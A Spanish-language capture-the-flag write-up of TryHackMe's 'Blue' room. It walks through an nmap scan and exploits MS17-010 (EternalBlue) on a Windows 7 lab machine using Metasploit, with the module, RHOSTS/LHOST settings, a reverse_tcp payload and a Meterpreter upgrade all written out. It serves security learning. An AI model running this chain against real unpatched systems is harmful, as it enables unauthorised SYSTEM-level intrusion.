# Writeup Blue - TryHackMe

| **Información** | **Detalle** |
| :--- | :--- |
| **IP** | 10.113.174.172 |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Windows |
| **Dificultad** | Fácil |


---

## Tabla de Contenidos

1. [Reconocimiento](#reconocimiento)
2. [Enumeración](#enumeración)
3. [Explotación](#explotación)
4. [Post-Explotación y Escalada de Privilegios](#post-explotación-y-escalada-de-privilegios)
   - [Estabilización y Conversión a Meterpreter](#estabilización-y-conversión-a-meterpreter)
5. [Flags](#flags)

---

## Reconocimiento
Lo primero que vamos a hacer, como manda el guion, es un escaneo de puertos para ver exactamente qué tenemos abierto.

```bash
sudo nmap -A -sS -Pn 10.113.174.172 -oN blue_scan.txt

```

### Resultados del Escaneo

```bash
# Nmap 7.95 scan initiated Tue Mar 10 20:10:51 2026 as: nmap -A -sS -Pn -oN blue_scan.txt 10.113.174.172
Nmap scan report for 10.113.174.172
Host is up (0.074s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2026-03-09T18:51:47
|_Not valid after:  2026-09-08T18:51:47
|_ssl-date: 2026-03-10T19:12:24+00:00; -1s from scanner time.
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
49165/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Network Distance: 3 hops
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-03-10T14:12:09-05:00
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 06:43:38:29:c0:2d (unknown)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h14m59s, deviation: 2h30m00s, median: -1s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-03-10T19:12:09
|_  start_date: 2026-03-10T18:50:58

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   69.13 ms 192.168.128.1
2   ...
3   72.04 ms 10.113.174.172

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 10 20:12:25 2026 -- 1 IP address (1 host up) scanned in 93.46 seconds


```


## Enumeración
¡Ya tenemos los resultados!, y son... un tanto interesantes. Tenemos muchos puertos abiertos dentro de las máquinas y el puerto que más me llama la atención es el puerto 445, para los amigos, el puerto SMB, y nos indica que es un Windows 7 Professional 7601 Service Pack 1, y al realizar una simple búsqueda en Internet, nos salta la puerta donde podemos entrar con la siguiente herramienta que podemos usar. 
Es vulnerable a... ¡MS17-010!, conocido por nosotros como EternalBlue, donde se lió parda en 2017 con el ataque de WannaCry.

![Confirmación MS17-010](/imgBlue/image.png)
*Buena pista encontrada: MS17-010 encaja perfecto con el escenario.*


## Explotación

Para poder tener el codiciado acceso a nuestro equipo objetivo, debemos descargar una herramienta llamada **Metasploit Framework**. Es como la navaja suiza de la ciberseguridad, tremendamente útil y versátil para multitud de aplicaciones

Ahora, para buscar la vulnerabilidad que hemos visto en el paso anterior, debemos usar el comando `search type:exploit name:MS17-010`.

![Búsqueda del exploit en Metasploit](/imgBlue/image2.png)
*Resultado de la búsqueda del exploit anteriormente mencionado.*

Cuando ya tengamos la vulnerabilidad, usaremos ```set rhosts 10.113.174.172``` para establecer la IP de nuestro objetivo.

![Configuración de RHOSTS](/imgBlue/image3.png)
*mostrando la ip del objetivo para su acceso.*

```bash
# Comandos utilizados
search type:exploit name:MS17-010
use 0
show options
set RHOSTS 10.113.174.172

```

Esto me ha pasado más de una vez, pero algo que siempre pasa y que me toca la moral, es que pilla por alguna razón la IP de la tarjeta de red del PC (escrito desde un HP Pavilion Plus 14 con Parrot), y no la del túnel VPN, por lo que tendremos que asignarla manualmente.

```bash
set LHOST 192.168.168.157
run

```


## Post-Explotación y escalada de privilegios

¡Bingo! Hemos entrado al equipo sin demasiados problemas. Hay que tener en cuenta que este exploit puede ser inestable y puede fallar antes de funcionar.

¡Como hemos explotado una vulnerabilidad como la de EternalBlue, hemos conseguido directamente acceso de administrador!, al escribir whoami, nos sale directamente que somos NT AUTHORITY\SYSTEM, y ya podríamos hacer lo que queramos dentro del sistema.

```bash
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
## Si queremos acceder como usuario y después escalar privilegios

- Lo primero que debemos que hacer es buscar la vulnerabilidad que hemos visto en el paso anterior, debemos usar el comando `search type:exploit name:MS17-010`.

- Después, al elegir la vulnerabilidad, en vez de usar el shell que nos proporciona por defecto, usaremos `set payload windows/x64/shell/reverse_tcp`, que nos dará acceso como usuario a la máquina.

![payload](/imgBlue/image4.png)

- Después, al igual que antes, estableceremos la IP de nuestro objetivo y la IP de nuestra máquina.

```bash
set RHOSTS 10.113.174.172
set LHOST 192.168.168.157
run
```
```bash
C:\Windows\system32>echo estamos dentro
echo estamos dentro
estamos dentro
```

Listo, estamos dentro de la máquina. Ahora ponemos en "background" la shell para empezar con la escalada de privilegios (Ctrl+Z).

Después, para escalar de shell, utilizaremos el módulo `post/multi/manage/shell_to_meterpreter`, para convertir la shell normal que acabamos de obtener en una shell de Meterpreter. Es muy sencillo de configurar, solo debemos establecer la ID de la sesión que obtuvimos antes (que en mi caso es 1) y se ejecutaría sin problema.

![shell_to_meterpreter](/imgBlue/image5.png)
*El exploit funcionando correctamente.*

¡Perfecto! Ya tenemos una shell de Meterpreter con privilegios de administrador, y ya podríamos hacer lo que queramos dentro del sistema.

